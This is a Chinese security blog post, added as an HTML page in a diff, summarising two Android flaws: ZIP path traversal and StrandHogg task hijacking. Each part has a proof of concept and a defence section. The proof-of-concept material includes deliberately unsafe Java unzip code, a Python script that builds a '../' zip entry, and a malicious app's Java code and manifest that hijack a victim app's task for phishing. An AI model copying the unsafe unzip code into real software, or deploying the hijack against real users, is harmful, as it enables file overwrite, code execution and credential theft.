@@ -1,0 +1,701 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+       
+      <meta name="keywords" content="生活，思考 ，渗透，审计，代码。。。" />
+       
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>Android常见漏洞总结 |  小透的少年江湖</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/haoyun.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-Android常见漏洞总结"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  Android常见漏洞总结
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2023/03/12/Android%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" class="article-date">
+  <time datetime="2023-03-12T12:14:28.000Z" itemprop="datePublished">2023-03-12</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/">逆向分析</a> / <a class="article-category-link" href="/categories/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/android/">android</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">2.5k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">10 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="Android常见漏洞总结"><a href="#Android常见漏洞总结" class="headerlink" title="Android常见漏洞总结"></a>Android常见漏洞总结</h1><h2 id="文件解压漏洞"><a href="#文件解压漏洞" class="headerlink" title="文件解压漏洞"></a>文件解压漏洞</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>由于压缩文件ZIP类型的压缩包文件名允许存在特殊字符，没有格式要求，在Android系统中攻击者可以精心构造ZIP文件，利用多个..&#x2F;来改变ZIP包中某个文件的存放位置，以替换原有文件的目的。如果被替换掉的文件是是 .so、.dex 或 .odex 类型文件，那么攻击者就可以轻易更改原有的代码逻辑，轻则产生本地拒绝服务漏洞，影响应用的可用性，重则可能造成任意代码执行漏洞，危害应用用户的设备安全和信息安全。比如寄生兽漏洞、海豚浏览器远程命令执行漏洞和三星默认输入法远程代码执行等著名的安全事件。</p>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Java 代码在解压 ZIP 文件时，会使用到 ZipEntry 类的 getName() 方法，如果 ZIP 文件中包含 “..&#x2F;” 的字符串，该方法返回值里面原样返回，如果没有过滤掉 getName() 返回值中的 “..&#x2F;” 字符串，继续解压缩操作，就会在其他目录中创建解压的文件。</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>下面的代码是将位于程序包下的test.zip文件解压缩到本目录下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">ActionBarActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String TAG = <span class="string">&quot;MainActivity&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button button_Activity1 = (Button) findViewById(R.id.button);</span><br><span class="line">        button_Activity1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                String zipPath = getApplicationContext().getCacheDir()+<span class="string">&quot;/test.zip&quot;</span>; <span class="comment">//压缩包路径</span></span><br><span class="line">                String unzipPath = getApplicationContext().getCacheDir().toString(); <span class="comment">//解压路径</span></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    unzipFile(zipPath,unzipPath);</span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException e)</span><br><span class="line">                &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">unzipFile</span><span class="params">(String zipPath,String outputDirectory)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Log.i(TAG,<span class="string">&quot;解压文件: &quot;</span>+zipPath+<span class="string">&quot;\n&quot;</span>+<span class="string">&quot;解压文件: &quot;</span>+outputDirectory);</span><br><span class="line">        File file = <span class="keyword">new</span> File(outputDirectory); <span class="comment">//创建解压目录对象实例化</span></span><br><span class="line">        <span class="keyword">if</span>(!file.exists())</span><br><span class="line">        &#123;</span><br><span class="line">            file.mkdir();<span class="comment">//不存在则创建</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//读取压缩文件</span></span><br><span class="line">        InputStream inputStream = <span class="keyword">new</span> FileInputStream(zipPath);</span><br><span class="line">        ZipInputStream zipInputStream = <span class="keyword">new</span> ZipInputStream(inputStream);</span><br><span class="line">        ZipEntry zipEntry = zipInputStream.getNextEntry(); <span class="comment">//读取一个进入点</span></span><br><span class="line">        <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>*<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;<span class="comment">//记录解压字节数</span></span><br><span class="line">        <span class="keyword">while</span>(zipEntry !=<span class="keyword">null</span>)<span class="comment">//遍历文件和目录</span></span><br><span class="line">        &#123;</span><br><span class="line">            Log.i(TAG,<span class="string">&quot;解压文件 入口 1： &quot;</span> +zipEntry );</span><br><span class="line">            <span class="keyword">if</span> (!zipEntry.isDirectory()) &#123;  <span class="comment">//如果是一个文件</span></span><br><span class="line">                <span class="comment">// 如果是文件</span></span><br><span class="line">                String fileName = zipEntry.getName();</span><br><span class="line">                <span class="comment">//Log.i(TAG,&quot;解压文件 原来 文件的位置： &quot; + fileName);</span></span><br><span class="line">                <span class="comment">//fileName = fileName.substring(fileName.lastIndexOf(&quot;/&quot;) + 1);  //截取文件的名字 去掉原文件夹名字</span></span><br><span class="line">                Log.i(TAG,<span class="string">&quot;解压文件 的名字： &quot;</span> + fileName);</span><br><span class="line">                file = <span class="keyword">new</span> File(outputDirectory + File.separator + fileName);  <span class="comment">//放到新的解压的文件路径</span></span><br><span class="line">                file.createNewFile();</span><br><span class="line">                FileOutputStream fileOutputStream = <span class="keyword">new</span> FileOutputStream(file);</span><br><span class="line">                <span class="keyword">while</span> ((count = zipInputStream.read(buffer)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    fileOutputStream.write(buffer, <span class="number">0</span>, count);</span><br><span class="line">                &#125;</span><br><span class="line">                fileOutputStream.close();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 定位到下一个文件入口</span></span><br><span class="line">            zipEntry = zipInputStream.getNextEntry();</span><br><span class="line">            Log.i(TAG,<span class="string">&quot;解压文件 入口 2： &quot;</span> + zipEntry );</span><br><span class="line">        &#125;</span><br><span class="line">        zipInputStream.close();</span><br><span class="line">        Log.i(TAG,<span class="string">&quot;解压完成&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接下来将..&#x2F;test.txt的文件进行压缩保存为test.zip</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">zip</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            binary = f.read()</span><br><span class="line">            zipFile = zipfile.ZipFile(<span class="string">&quot;test.zip&quot;</span>, <span class="string">&quot;a&quot;</span>, zipfile.ZIP_DEFLATED)</span><br><span class="line">            zipFile.writestr(<span class="string">&quot;../test.txt&quot;</span>, binary)</span><br><span class="line">            zipFile.close()</span><br><span class="line">    <span class="keyword">except</span> IOError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">zip</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>压缩成了test.zip，可以看到里面的为..&#x2F;test.txt文件</p>
+<img src="/2023/03/12/Android%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20231017190848855.png" class title="image-20231017190848855">
+
+<p>运行程序后，查看文件夹中变化，可以看到test.txt文件解压到了上一层目录下</p>
+<img src="/2023/03/12/Android%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20231017192135761.png" class title="image-20231017192135761">
+
+<h3 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><p>针对上述 ZIP 文件解压缩的目录穿越导致文件覆盖漏洞，修复建议如下：</p>
+<ul>
+<li>对重要的 ZIP 压缩包文件进行数字签名校验，校验通过才进行解压。</li>
+<li>检查 Zip 压缩包中使用 ZipEntry.getName() 获取的文件名中是否包含 ..&#x2F; 或者 ..，检查 ..&#x2F; 的时候不必进行 URI Decode（以防通过URI编码 ..%2F 来进行绕过），测试发现 ZipEntry.getName() 对于 Zip 包中有 ..%2F 的文件路径不会进行处理。</li>
+</ul>
+<p>Google建议的修复方案：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">InputStream is = new InputStream(untrustedFileName);</span><br><span class="line">ZipInputStream zis = new ZipInputStream(new BufferedInputStream(is));</span><br><span class="line">while((ZipEntry ze = zis.getNextEntry()) != null) &#123;</span><br><span class="line">  File f = new File(DIR, ze.getName());</span><br><span class="line">  String canonicalPath = f.getCanonicalPath();</span><br><span class="line">  if (!canonicalPath.startsWith(DIR)) &#123;</span><br><span class="line">    // SecurityException</span><br><span class="line">  &#125;</span><br><span class="line">  // Finish unzipping…</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="StrandHogg漏洞"><a href="#StrandHogg漏洞" class="headerlink" title="StrandHogg漏洞"></a>StrandHogg漏洞</h2><h3 id="漏洞简介-1"><a href="#漏洞简介-1" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>该漏洞允许攻击者冒充任意合法应用,诱导受害者授予恶意应用权限或者进行恶意钓鱼攻击。由于该漏洞允许恶意软件劫持合法应用的活动,并将自身恶意活动插入在合法活动之前使得用户并没有意识到自己已经遭到攻击。至2020年1月26日,经过测试,该漏洞影响Android全版本,包括目前最新的Android10。</p>
+<h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>任务栈是指一堆activity的集合，以堆栈方式存放，一个任务栈中可以包含多个activity，可以来自不同应用。从一个acitivy启动新的一个activity时就会把前一个activity压入返回堆栈中。这个漏洞用到了android的两个属性taskAffinity和allowTaskReparenting。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">taskAffinity（任务相似性）：用来标识activity与任务的联系，该属性如果没有被设置，就从自身的 Application 继承，Application 的taskAffinity，它的值为 Manifest 的包名，也就是taskAffinity默认属性为自身应用包名的字符串</span><br><span class="line"></span><br><span class="line">allowTaskReparenting（任务重编）：这个属性会使该activity具有在任务栈被重新编排的能力，当下一次将启动 activity 的任务转至前台时， activity 是否可以从启动它的任务移动到和它具有相同taskAffinity属性的任务，转移的时机是在具有相同taskAffinity属性的任务转移到前台时，true代表能够移动，并且false如果它必须留在它所在的任务中。</span><br></pre></td></tr></table></figure>
+
+<p>因为大部分应用的taskAffinity属性都没有设置，默认为其包名，那么就可以通过一个在恶意软件的一个hackactivity属性中设置跟我们攻击的应用的包名一致的taskAffinity值。</p>
+<p>那么该hackactivitystart的时候就会创建一个与victim应用的taskAffinity属性相同的一个任务栈，到时候会和victim的应用共享一个任务栈，并且位于该任务栈的根，在我们启动受害应用时，该victim的任务就会被放到前台，然后位于根的hackactivity就会放到前台。</p>
+<p>那么当我们打开受害应用所看到的activity，并不是该应用原有的activity，而是我们的hackactivity，那么我们可以在hackactivity设计成一个钓鱼页面，实现钓鱼攻击，获取用户的隐私和诱导用户授予恶意软件相应权限。</p>
+<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>复现需要一个正常的APP和一个包含攻击代码的APP。</p>
+<p>正常合法app如下图所示，一个很简单的只有输出”Hello World！”的图形界面</p>
+<img src="/2023/03/12/Android%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20231017194144487.png" class title="image-20231017194144487">
+
+<p>接下来新建一个利用此漏洞的恶意软件项目，需要新建两个布局，布局代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">activity_main.xml//只显示Innocent字符串</span><br><span class="line">&lt;linearlayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;</span><br><span class="line">    xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;</span><br><span class="line">    xmlns:tools=&quot;http://schemas.android.com/tools&quot;</span><br><span class="line">    android:layout_width=&quot;match_parent&quot;</span><br><span class="line">    android:layout_height=&quot;match_parent&quot;</span><br><span class="line">    tools:context=&quot;.MainActivity&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;textview</span><br><span class="line">        android:layout_width=&quot;wrap_content&quot;</span><br><span class="line">        android:layout_height=&quot;wrap_content&quot;</span><br><span class="line">        android:text=&quot;Innocent&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/textview&gt;</span><br><span class="line">&lt;/linearlayout&gt;</span><br><span class="line"></span><br><span class="line">attack.xml//显示Attack Success!字符串，这里为攻击成功后显示的</span><br><span class="line">&lt;linearlayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;</span><br><span class="line">    xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;</span><br><span class="line">    xmlns:tools=&quot;http://schemas.android.com/tools&quot;</span><br><span class="line">    android:layout_width=&quot;match_parent&quot;</span><br><span class="line">    android:layout_height=&quot;match_parent&quot;</span><br><span class="line">    tools:context=&quot;.MainActivity&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;textview</span><br><span class="line">        android:layout_width=&quot;wrap_content&quot;</span><br><span class="line">        android:layout_height=&quot;wrap_content&quot;</span><br><span class="line">        android:text=&quot;Attack Success!&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/textview&gt;</span><br><span class="line">&lt;/linearlayout&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上面设计两个布局界面的原因是为了隐藏恶意代码攻击成功的意图,接下来就编写代码显示上面上个布局</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">ActionBarActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="comment">//setContentView(R.layout.activity_main);</span></span><br><span class="line">        Intent innocent,attack;</span><br><span class="line">        attack=<span class="keyword">new</span> Intent(<span class="keyword">this</span>,Attack.class);</span><br><span class="line">        attack.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);<span class="comment">//将attack活动放置在一个新task中</span></span><br><span class="line">        attack.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);<span class="comment">//取消过度动画,增加恶意软件迷惑性</span></span><br><span class="line">        innocent=<span class="keyword">new</span> Intent(<span class="keyword">this</span>,Innocent.class);</span><br><span class="line">        innocent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);</span><br><span class="line">        startActivities(<span class="keyword">new</span> Intent[]&#123;attack,innocent&#125;);<span class="comment">//先后启动attack活动与innocent活动</span></span><br><span class="line">        finish();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先创建了成员变量分别为innocent,attack的两个Intent对象，attack和innocent都带上了FLAG_ACTIVITY_NEW_TASK这个Flag，带上该Flag的Intent创建的活动都会在各自的任务栈中,互不影响。其中attack还带有FLAG_ACTIVITY_NO_ANIMATION这个flag，带有该Flag的Intent创建的活动将不显示过度动画。</p>
+<p>接着我调用了startActivities方法先后启动attack和innocent这两个活动注意,Innocent这个活动在Attack启动之后才被启动,在活动先后顺序上,Innocent在最顶层，所以用户最终看到的活动只有Innocent这个无害活动，而Attack启动时取消了过度动画,除了个别机型会有稍微闪动外,在启动时无明显变化,从而增加了恶意软件迷惑性。</p>
+<p>攻击者要怎么利用漏洞将恶意活动插入到合法活动之前呢？这里就要用到AndroidManifest.xml中编辑配置文件，将taskAffinity属性就是欲攻击应用的包名，allowTaskReparenting属性为true。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;activity</span><br><span class="line">            android:name=&quot;.MainActivity&quot;</span><br><span class="line">            android:label=&quot;@string/app_name&quot; &gt;</span><br><span class="line">            &lt;intent-filter&gt;</span><br><span class="line">                &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;</span><br><span class="line"></span><br><span class="line">                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;</span><br><span class="line">            &lt;/intent-filter&gt;</span><br><span class="line">        &lt;/activity&gt;&lt;activity android:name=&quot;.Innocent&quot;&gt;</span><br><span class="line">        &lt;activity</span><br><span class="line">            android:allowtaskreparenting=&quot;true&quot;</span><br><span class="line">            android:name=&quot;.Attack&quot;</span><br><span class="line">            android:taskaffinity=&quot;com.victim.app&quot;&gt;</span><br><span class="line">        &lt;!--</span><br><span class="line">        其中欲插入到合法活动前的恶意活动的taskAffinity属性就是欲攻击应用的包名</span><br><span class="line">        allowTaskReparenting属性为true</span><br><span class="line">        --&gt;</span><br><span class="line">    &lt;/application&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="漏洞防御-1"><a href="#漏洞防御-1" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><p>现在taskAffinity属性只对相同UID的应用有效，也就是说，只有共享UID的应用才可以进行activity的移动，uid在应用安装时被分配，并且在应用存在于手机上期间，都不会改变。</p>
+<p>一个应用程序只能有一个uid，多个应用可以使用sharedUserId 方式共享同一个uid，但前提是这些应用的签名要相同。恶意应用也无法伪造uid，导致无法实现攻击。</p>
+ 
+      <!-- reward -->
+      
+      <div id="reword-out">
+        <div id="reward-btn">
+          打赏
+        </div>
+      </div>
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/03/12/Android%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%80%86%E5%90%91-android/" rel="tag">-逆向 -android</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            App逆向案例-dudu牛
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2023/03/12/Flask%E6%A1%86%E6%9E%B6/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">Flask框架</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.staticfile.org/valine/1.4.16/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "BAHT50PldtBLrMFvOb5LqqlL-gzGzoHsz",
+    app_key: "tj3HfiFvtJ3pRIhgXGBqdN7b",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+   
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2021-2024
+        <i class="ri-heart-fill heart_icon"></i> John Doe
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
